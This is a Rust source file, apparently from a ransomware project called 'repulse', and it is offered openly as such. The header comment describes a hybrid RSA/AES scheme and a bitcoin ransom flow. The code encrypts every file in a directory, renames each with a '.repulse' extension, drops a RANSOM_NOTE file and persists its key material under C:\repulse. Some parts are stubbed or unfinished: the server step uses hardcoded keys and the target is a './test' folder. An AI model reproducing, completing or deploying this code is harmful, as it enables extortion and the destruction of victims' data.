/*! Theory of encryption:
 *
 * 1. Client initiates connection with server and reports hardware data and personal info dump
 * 2. Server generates an RSA key-pair for the client machine, and a new bitcoin address
 * 3. Server encrypts the RSA private key using its own master key
 * 4. RSA Public key, encrypted RSA private key, and the bitcoin address are sent back to the client
 * 5. Client stores the encrypted private key on disk in a location dependent on the hwid for later retrieval
 * 6. Client generates a symmetric encryption key for each file and encrypts the file using AES-512 CBC. The symmetric encryption key for that file is encrypted with the RSA public key and prepended to the file.
 * 7. If bitcoin is paid, client sends a request to the server with its assigned bitcoin address and encrypted private key. If the server confirms the payment, the private key is decrypted using the server's master private key, and sent back to the client
 * 8. Files are decrypted with the inverse of the encryption method.
 *
 * This way, the files can be decrypted on the device locally if the master key is known without depending on the server storing all the private keys in a database.
 */

use std::{
    fs, io,
    path::PathBuf,
    sync::{Arc, RwLock},
};

use lazy_static::lazy_static;

use rsa::{
    pkcs8::DecodePrivateKey, pkcs8::DecodePublicKey, pkcs8::EncodePublicKey, RsaPrivateKey,
    RsaPublicKey,
};

use crate::{
    assets::Assets,
    common::ensure_path_and_write,
    debug,
    encryption::{self, create_rsa_key_pair, decrypt, encrypt, RsaExt},
    hardware_info,
};

lazy_static! {
    pub static ref RANSOM_CONTEXT: Arc<RwLock<Option<RansomContext>>> = Arc::new(RwLock::new(None));
}

pub struct RansomContext {
    pub public_key: RsaPublicKey,
    pub encrypted_private_key: Vec<u8>,
    pub bitcoin_address: String,
    decrypted_private_key: Option<RsaPrivateKey>,
    completed: bool,
    saved: bool,
}

#[derive(Debug)]
pub enum EncryptionError {
    FileDoesNotExist,
    FileAccessDenied,
    IsNotFile,
    DirectoryDoesNotExist,
    DirectoryAccessDenied,
    IsNotDirectory,
}

impl RansomContext {
    const PUBLIC_KEY_PATH: &'static str = r"C:\repulse\client_public_key.repulse";
    const PRIVATE_KEY_PATH: &'static str = r"C:\repulse\client_private_key.repulse";
    const BITCOIN_ADDRESS_PATH: &'static str = r"C:\repulse\bitcoin_address.repulse";
    const COMPLETED_PATH: &'static str = r"C:\repulse\completed.repulse";

    /// Loads the context from disk if it exists or creates a new one from the server if it does not
    ///
    /// ALso ensures that the context is saved persisted on the disk
    fn load_or_create() -> Self {
        let mut context = Self::load_from_disk().unwrap_or_else(|| Self::create_from_sever());

        context
            .ensure_context_saved()
            .expect("Could not save ransom context");

        context
    }

    /// Communicates with server to generate RSA key pair and the Bitcoin address
    #[allow(deprecated)]
    fn create_from_sever() -> Self {
        debug!("Creating new context from \"server\"");

        let _hardware_info = hardware_info::get_hardware_info();

        // TODO Negotiate with server to obtain encryption keys, and remove hardcoded ones

        const MASTER_PUBLIC_KEY: &'static str = include_str!("../keys/master.pub");
        let master_public_key = RsaPublicKey::from_public_key_pem(MASTER_PUBLIC_KEY).unwrap();

        let (client_private_key, client_public_key) = create_rsa_key_pair();

        /* Package up the data for the client to use */

        // Encode the public key as a string
        let client_public_key = client_public_key.to_string();

        // Encrypt the private key with the master public key
        let client_private_key = encrypt(
            client_private_key.to_string().as_bytes(),
            &master_public_key,
        );

        // Create bitcoin address
        let bitcoin_address = format!("0x{:X?}", encryption::random_bytes::<32>());

        // Return all the data from the "server"
        RansomContext {
            public_key: RsaPublicKey::from_public_key_pem(&client_public_key).unwrap(),
            encrypted_private_key: client_private_key,
            bitcoin_address,
            decrypted_private_key: None,
            completed: false,
            saved: false,
        }
    }

    fn load_from_disk() -> Option<Self> {
        let (Ok(public_key), Ok(encrypted_private_key), Ok(bitcoin_address)) = (fs::read_to_string(PathBuf::from(Self::PUBLIC_KEY_PATH)), fs::read(PathBuf::from(Self::PRIVATE_KEY_PATH)), fs::read_to_string(PathBuf::from(Self::BITCOIN_ADDRESS_PATH))) else {
            return None;
        };

        let Ok(public_key) = RsaPublicKey::from_public_key_pem(&public_key) else {
            return None;
        };

        let completed = PathBuf::from(Self::COMPLETED_PATH).exists();

        debug!("Successfully loaded context from disk!");

        Some(RansomContext {
            public_key,
            encrypted_private_key,
            bitcoin_address,
            decrypted_private_key: None,
            completed,
            saved: true,
        })
    }

    fn save_to_disk(&mut self) -> io::Result<()> {
        // Save public key to a file (in case we get interrupted)
        ensure_path_and_write(
            PathBuf::from(Self::PUBLIC_KEY_PATH),
            &self
                .public_key
                .to_public_key_pem(rsa::pkcs8::LineEnding::CRLF)
                .unwrap()
                .as_str()
                .to_owned(),
        )?;

        // Save encrypted private key to a file (for recovery later)
        ensure_path_and_write(
            PathBuf::from(Self::PRIVATE_KEY_PATH),
            &self.encrypted_private_key,
        )?;

        // Save bitcoin_address to a file (in case we get interrupted)
        ensure_path_and_write(
            PathBuf::from(Self::BITCOIN_ADDRESS_PATH),
            &self.bitcoin_address,
        )?;

        self.saved = true;

        Ok(())
    }

    fn ensure_context_saved(&mut self) -> io::Result<()> {
        if !self.is_saved() {
            self.save_to_disk()?;
        }

        Ok(())
    }

    #[inline]
    fn is_completed(&self) -> bool {
        self.completed
    }

    #[inline]
    fn is_saved(&self) -> bool {
        self.saved
    }

    fn set_private_key(&mut self, private_key: RsaPrivateKey) {
        self.decrypted_private_key = Some(private_key)
    }

    #[allow(unreachable_code)]
    fn scan_fs_for_completion(&self) {
        todo!("Scan entire computer to check if there are any unencrypted files");
    }

    #[allow(unreachable_code)]
    fn find_unencrypted_files(&self, directory: &PathBuf) -> Result<Vec<PathBuf>, EncryptionError> {
        if !directory
            .try_exists()
            .map_err(|_| EncryptionError::DirectoryAccessDenied)?
        {
            return Err(EncryptionError::DirectoryDoesNotExist);
        }

        if !directory.is_dir() {
            return Err(EncryptionError::IsNotDirectory);
        }

        let files = directory
            .read_dir()
            .map_err(|_| EncryptionError::DirectoryAccessDenied)?;

        let files: Vec<_> = files
            .filter_map(|file| file.ok().and_then(|file| Some(file.path())))
            .filter(|path| path.extension().is_some_and(|ext| ext != "repulse"))
            .collect();

        Ok(files)
    }

    #[allow(unreachable_code)]
    fn find_encrypted_files(&self, directory: &PathBuf) -> Result<Vec<PathBuf>, EncryptionError> {
        if !directory
            .try_exists()
            .map_err(|_| EncryptionError::DirectoryAccessDenied)?
        {
            return Err(EncryptionError::DirectoryDoesNotExist);
        }

        if !directory.is_dir() {
            return Err(EncryptionError::IsNotDirectory);
        }

        let files = directory
            .read_dir()
            .map_err(|_| EncryptionError::DirectoryAccessDenied)?;

        let files: Vec<_> = files
            .filter_map(|file| file.ok().and_then(|file| Some(file.path())))
            .filter(|path| {
                path.extension().is_some_and(|ext| ext == "repulse")
                    && path
                        .file_name()
                        .is_some_and(|name| name != "RANSOM_NOTE.repulse")
            })
            .collect();

        Ok(files)
    }

    #[allow(unreachable_code)]
    fn encrypt_all_files(&self, directory: &PathBuf) -> Result<(), EncryptionError> {
        let files = self.find_unencrypted_files(directory)?;

        // TODO add multithreading
        for file in files {
            self.encrypt_file(&file)?;
        }

        let ransom_note = Assets::get("ransom_note.txt").unwrap().data;

        let ransom_note_path = directory.join("RANSOM_NOTE.repulse");
        fs::write(ransom_note_path, ransom_note).map_err(|_| EncryptionError::FileAccessDenied)?;

        Ok(())
    }

    #[allow(unreachable_code)]
    fn decrypt_all_files(&self, directory: &PathBuf) -> Result<(), EncryptionError> {
        let files = self.find_encrypted_files(directory)?;

        // TODO add multithreading
        for file in files {
            self.decrypt_file(&file)?;
        }

        let ransom_note_path = directory.join("RANSOM_NOTE.repulse");
        fs::remove_file(ransom_note_path).map_err(|_| EncryptionError::FileAccessDenied)?;

        Ok(())
    }

    #[allow(unreachable_code)]
    fn encrypt_file(&self, file: &PathBuf) -> Result<(), EncryptionError> {
        if !file
            .try_exists()
            .map_err(|_| EncryptionError::FileAccessDenied)?
        {
            return Err(EncryptionError::FileDoesNotExist);
        }

        if !file.is_file() {
            return Err(EncryptionError::IsNotFile);
        }

        let contents = fs::read(file).map_err(|_| EncryptionError::FileAccessDenied)?;

        let encrypted = encrypt(&contents, &self.public_key);

        fs::write(file, encrypted).map_err(|_| EncryptionError::FileAccessDenied)?;

        let mut file_name = file.to_str().unwrap().to_owned();
        file_name.push_str(".repulse");

        fs::rename(file, &file_name).map_err(|_| EncryptionError::FileAccessDenied)?;

        Ok(())
    }

    #[allow(unreachable_code)]
    fn decrypt_file(&self, file: &PathBuf) -> Result<(), EncryptionError> {
        if !file
            .try_exists()
            .map_err(|_| EncryptionError::FileAccessDenied)?
        {
            return Err(EncryptionError::FileDoesNotExist);
        }

        if !file.is_file() {
            return Err(EncryptionError::IsNotFile);
        }

        let contents = fs::read(file).map_err(|_| EncryptionError::FileAccessDenied)?;

        let encrypted = decrypt(&contents, self.decrypted_private_key.as_ref().unwrap());

        fs::write(file, &encrypted).map_err(|_| EncryptionError::FileAccessDenied)?;

        let file_name = file.to_str().unwrap().to_owned();
        let file_name = file_name.trim_end_matches(".repulse");

        fs::rename(file, &file_name).map_err(|_| EncryptionError::FileAccessDenied)?;

        Ok(())
    }
}

#[allow(unreachable_code)]
pub fn initiate_ransom_process() {
    debug!("Creating ransom context");

    // Create new ransom context or load it from disk if it already exists
    let mut ransom_context = RansomContext::load_or_create();

    debug!("Encrypting files!");

    ransom_context
        .encrypt_all_files(&PathBuf::from("./test"))
        .expect("Could not encrypt all files in directory");

    debug!("Encrypted all files!");

    let private_key = {
        const MASTER_PRIVATE_KEY: &'static str = include_str!("../keys/master.key");
        let master_private_key = RsaPrivateKey::from_pkcs8_pem(MASTER_PRIVATE_KEY).unwrap();

        let decrypted_private_key =
            decrypt(&ransom_context.encrypted_private_key, &master_private_key);
        let decrypted_private_key = String::from_utf8(decrypted_private_key)
            .expect("Could not create UTF-8 string from decoded private key bytes");
        let decrypted_private_key = RsaPrivateKey::from_pkcs8_pem(&decrypted_private_key).unwrap();

        decrypted_private_key
    };

    ransom_context.set_private_key(private_key);

    debug!("Decrypting files!");

    ransom_context
        .decrypt_all_files(&PathBuf::from("./test"))
        .expect("Could not decrypt all files in directory");

    debug!("Decrypted all files!");

    *RANSOM_CONTEXT.write().unwrap() = Some(ransom_context);

    todo!("Spawn thread pool to encrypt files");
}

#[allow(unreachable_code)]
pub fn await_ransome_process() {
    todo!("Join all encryption threads and wait for completion");
}
